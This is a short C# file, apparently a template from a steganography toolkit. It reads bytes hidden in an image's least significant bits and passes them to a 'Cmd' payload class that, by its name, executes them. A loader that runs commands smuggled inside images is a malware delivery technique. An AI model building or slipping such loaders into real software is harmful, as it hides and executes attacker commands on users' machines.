using System.Drawing;


namespace csharp
{
    class Reader
    {
        static byte[] payload_data;

        static Bitmap bm;


        // TEMPLATES GO HERE
        static Delivery.Local del  = new Delivery.Local();
        static Algorithms.LsbX algs = new Algorithms.LsbX(1);
        static Payloads.Cmd    pld  = new Payloads.Cmd();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_bits = System.Int32.Parse(args[0]);
                payload_data = new byte[payload_bits / 8];

                bm = del.load_image(args[1]);
                algs.read_image(bm, payload_data);
                pld.run(payload_data);
            }
        }
    }
}
